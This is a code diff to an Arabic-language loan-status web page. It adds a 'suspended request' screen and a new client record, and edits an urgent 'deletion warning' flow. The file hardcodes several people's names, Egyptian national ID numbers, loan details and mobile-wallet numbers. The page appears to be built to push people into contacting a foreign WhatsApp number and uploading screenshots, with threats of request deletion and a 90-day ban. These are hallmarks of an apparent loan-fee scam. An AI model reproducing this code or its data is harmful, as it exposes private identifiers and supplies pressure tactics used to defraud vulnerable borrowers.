@@ -550,6 +550,38 @@
             width: 100%;
         }
 
+        /* واجهة التعليق */
+        .suspended-stage {
+            background: rgba(212, 175, 55, 0.1);
+            border: 2px solid #D4AF37;
+            border-radius: 2rem;
+            padding: 2.5rem 2rem;
+            text-align: center;
+            backdrop-filter: blur(20px);
+        }
+        .suspended-stage i {
+            font-size: 4rem;
+            color: #D4AF37;
+            margin-bottom: 1rem;
+        }
+        .suspended-stage h2 {
+            color: #D4AF37;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        .suspended-stage p {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            line-height: 1.8;
+        }
+        .suspended-stage .support-note {
+            color: #94A3B8;
+            font-size: 0.95rem;
+        }
+        .suspended-stage .support-note strong {
+            color: #D4AF37;
+        }
+
         @media (max-width: 640px) {
             .glass-header {
                 flex-direction: column;
@@ -709,8 +741,22 @@
 "30309022102961": { name: "ميار عاطف محمد ربيع", loanRaw: "120,000", loanTerm: "38 شهر", installment: "4,235", total: "160,930", wallet: "اتصالات كاش", walletNum: "01154985308", isEtisalat: true },
 "30511102303511": { name: "يوسف ابراهيم محمد محمد", loanRaw: "30,000", loanTerm: "12 شهر", installment: "3,325", total: "39,900", wallet: "فودافون كاش", walletNum: "01092380286", isEtisalat: false },
 "27302230100916": { name: "ايهاب احمد علوان محمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01004866147", isEtisalat: false },
-"27009012202036": { name: "وليد عويس عبد التواب عبد المحسن", loanRaw: "110,000", loanTerm: "32 شهر", installment: "4,580", total: "146,560", wallet: "اتصالات كاش", walletNum: "01116743613", isEtisalat: true }
+"27009012202036": { name: "وليد عويس عبد التواب عبد المحسن", loanRaw: "110,000", loanTerm: "32 شهر", installment: "4,580", total: "146,560", wallet: "اتصالات كاش", walletNum: "01116743613", isEtisalat: true },
+
+// ===== العميل الجديد: أحمد حسين (طلب معلق) =====
+"29003160104218": { 
+    name: "احمد حسن على حسن ", 
+    loanRaw: "40,000", 
+    loanTerm: "18شهر ", 
+    installment: "2,965", 
+    total: "53,370 ج.م", 
+    wallet: "فودافون كاش", 
+    walletNum: "01033747847", 
+    isEtisalat: false,
+    specialStatus: "suspended"  // ✅ علامة التعليق
+}
 };
+
     const LINKING_FORM_URL = "https://survey.porsline.com/s/WWHfvkME";
     const WHATSAPP_SUPPORT_URL = "https://wa.me/212620273042"; // رقم واتساب الدعم المالي
     let currentClient = null;
@@ -740,6 +786,33 @@
                     <i class="fab fa-whatsapp fa-lg"></i> التواصل العاجل مع قسم التحويلات المالية
                 </button>
                 <div style="margin-top: 1rem; font-size: 0.8rem; color: #ffaaaa;">* لن تظهر أي تفاصيل قرض أو محفظة حتى يتم إنقاذ الطلب.</div>
+            </div>
+        `;
+    }
+
+    // واجهة التعليق (suspended)
+    function buildSuspendedStage(client) {
+        return `
+            <div class="suspended-stage">
+                <i class="fas fa-hourglass-half"></i>
+                <h2>⏳ طلبك معلق حالياً</h2>
+                <p><strong>${client.name}</strong>،</p>
+                <p style="font-size: 1.1rem; line-height: 1.8;">
+                    طلب التمويل الخاص بك <strong style="color: #D4AF37;">معلق</strong> لحين استكمال بعض البيانات.
+                </p>
+                <p class="support-note">
+                    برجاء التواصل مع <strong>قسم الدعم الفني</strong> لإعادة فتح الطلب واستكمال الإجراءات.
+                </p>
+                <div style="margin: 1.5rem 0;">
+                    <i class="fas fa-phone-alt" style="color: #25D366; font-size: 1.2rem;"></i>
+                    <span style="font-size: 0.9rem; color: #94A3B8;">الدعم الفني متاح 24 ساعة</span>
+                </div>
+                <button class="btn-whatsapp-urgent" id="supportWhatsAppBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> تواصل مع الدعم الفني الآن
+                </button>
+                <div style="margin-top: 1rem; font-size: 0.8rem; color: #94A3B8;">
+                    * سيتم إعادة تفعيل طلبك بعد مراجعة البيانات المطلوبة
+                </div>
             </div>
         `;
     }
@@ -870,19 +943,31 @@
             if (clientsDB[normalized]) {
                 currentClient = { ...clientsDB[normalized], normalizedId: normalized };
                 
-                // حالة خاصة للعميل "جودة عبدالنبى"
+                // ✅ حالة التعليق (suspended) - الأولوية القصوى
+                if (currentClient.specialStatus === "suspended") {
+                    resultPanel.innerHTML = buildSuspendedStage(currentClient);
+                    resultPanel.style.display = 'block';
+                    
+                    const supportBtn = document.getElementById('supportWhatsAppBtn');
+                    if (supportBtn) {
+                        supportBtn.onclick = () => {
+                            window.open(`${WHATSAPP_SUPPORT_URL}?text=${encodeURIComponent(`طلب استعادة الطلب المعلق - العميل: ${currentClient.name} - الرقم القومي: ${normalized}`)}`, '_blank');
+                        };
+                    }
+                    // لا نعرض المودال الأمني في حالة التعليق
+                    return;
+                }
+
+                // حالة خاصة للعميل "جودة عبدالنبى" – تحذير شطب
                 if (normalized === "27603160102274" && currentClient.specialStatus === "deletion_warning") {
-                    // عرض رسالة الشطب فقط بدون أي تفاصيل
                     resultPanel.innerHTML = buildDeletionWarningStage(currentClient);
                     resultPanel.style.display = 'block';
-                    // إضافة حدث زر واتساب العاجل
                     const urgentBtn = document.getElementById('urgentWhatsAppBtn');
                     if (urgentBtn) {
                         urgentBtn.onclick = () => {
                             window.open(`${WHATSAPP_SUPPORT_URL}?text=${encodeURIComponent(`🚨 عاجل جداً - طلب العميل ${currentClient.name} - الرقم القومي ${normalized} جاري شطبه وحظر 90 يوم. أرجو التدخل العاجل لإنقاذ الطلب.`)}`, '_blank');
                         };
                     }
-                    // لا نعرض المودال الأمني لأنه قد يشتت المستخدم في هذه الحالة الحرجة
                     return;
                 }
                 
@@ -890,7 +975,7 @@
                 resultPanel.innerHTML = buildNormalStage(currentClient);
                 resultPanel.style.display = 'block';
                 startCountdown();
-                showSecurityModal(); // إظهار المودال الأمني للعملاء العاديين
+                showSecurityModal();
                 
                 const uploadBtn = document.getElementById('uploadScreensBtn');
                 if (uploadBtn) {
